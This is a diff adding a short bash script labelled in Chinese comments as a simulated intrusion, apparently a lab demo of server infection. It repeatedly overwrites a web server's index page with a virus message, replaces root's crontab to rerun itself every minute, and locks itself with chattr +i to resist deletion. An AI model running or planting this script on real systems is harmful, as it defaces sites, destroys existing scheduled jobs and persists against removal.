@@ -1,0 +1,18 @@
+#!/usr/bin/bash
+
+web_site=/var/www/html/index.html
+
+# 模拟入侵
+while true
+do
+	echo "我是病毒的Code" > ${web_site}
+	sleep 10
+	
+	# 2.将这个脚本放入定时任务中
+	echo "*/1 * * * * /bin/bash /usr/bin/virus  &>/dev/null" > /var/spool/cron/root
+
+	# 3.将脚本锁住（）
+	chattr +i /usr/bin/virus
+done
+
+
